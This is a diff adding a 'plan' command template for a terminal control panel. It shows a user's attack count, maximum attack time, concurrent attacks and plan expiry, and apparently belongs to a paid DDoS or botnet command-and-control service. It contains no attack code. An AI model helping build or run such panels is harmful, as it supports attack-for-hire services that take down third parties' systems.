@@ -1,0 +1,20 @@
+name="plan"
+description="Show the details of your plan"
+# permissions who can access this command
+permissions=""
+# themes which have this command within their scope (empty to not assign to a theme)
+themes="default"
+---------------------------- START ----------------------------
+<<clear()>>
+ <<style.color("mew", "[")>> [38;2;255;255;255mCurrent Plan Details /<<style.color("mew", ">")>> [38;2;255;255;255m
+
+   [38;2;255;255;255mUsername<<style.color("mew", ":")>> [38;2;255;255;255m<<style.color("mew", user.$username)>>
+
+   [38;2;255;255;255mAttacks<<style.color("mew", ":")>> [38;2;255;255;255m<<style.color("mew", db.attacksUser(user.$username))>>
+
+   [38;2;255;255;255mMaxtime<<style.color("mew", ":")>> [38;2;255;255;255m<<style.color("mew", user.$maxtime)>>
+
+   [38;2;255;255;255mConcurrents<<style.color("mew", ":")>> [38;2;255;255;255m<<style.color("mew", user.$conns)>>
+
+   [38;2;255;255;255mExpires On<<style.color("mew", ":")>> [38;2;255;255;255m<<style.color("mew", time.unix(user.$expiry, "01-02-2006"))>>
+
